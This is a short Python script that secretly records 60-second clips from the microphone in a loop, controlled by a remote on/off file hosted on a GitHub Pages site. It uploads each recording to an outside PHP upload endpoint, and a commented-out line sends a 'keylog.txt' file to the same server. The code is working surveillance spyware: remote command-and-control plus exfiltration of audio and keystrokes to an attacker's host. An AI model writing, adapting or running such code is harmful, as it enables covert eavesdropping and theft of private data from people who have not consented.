import sounddevice as sd
from scipy.io.wavfile import write
from datetime import datetime
import requests 
import time


def upload_file(filepath, url):
    filename = filepath.split('\\')[-1].split('/')[-1]
    with open(filepath, 'rb') as f:
        response = requests.post(
            url,
            files={'file': (filename, f, 'application/octet-stream')}
        )
    print("Server response:", response.text)

#upload_file("keylog.txt", "https://cranneymccabe.com/test/truth/upload.php")

run = True 

"""
def git_push():
    # Placeholder for git push functionality
    pass
"""

while run:
     # Check every 5 minutes
    status = requests.get("https://samjoel2007.github.io/tamilgaming/vc1.txt") 

    if status.text.strip() == "1":
        run = True
    else:
        run = False 
        time.sleep(300)
        continue
    # Recording settings
    sample_rate = 44100  # CD quality
    duration = 60        # seconds

    # Create filename with date and time
    filename = datetime.now().strftime("recording_%Y-%m-%d_%H-%M-%S.wav")

    print("Recording started...")

    # Record audio
    audio = sd.rec(int(duration * sample_rate), 
                   samplerate=sample_rate, 
                   channels=1)

    sd.wait()  # Wait until recording finishes

    # Save file
    write(filename, sample_rate, audio)

    print("Recording finished.")
    print(f"Saved as {filename}")

    upload_file(filename, "https://www.cranneymccabe.com/test/truth/upload.php")
    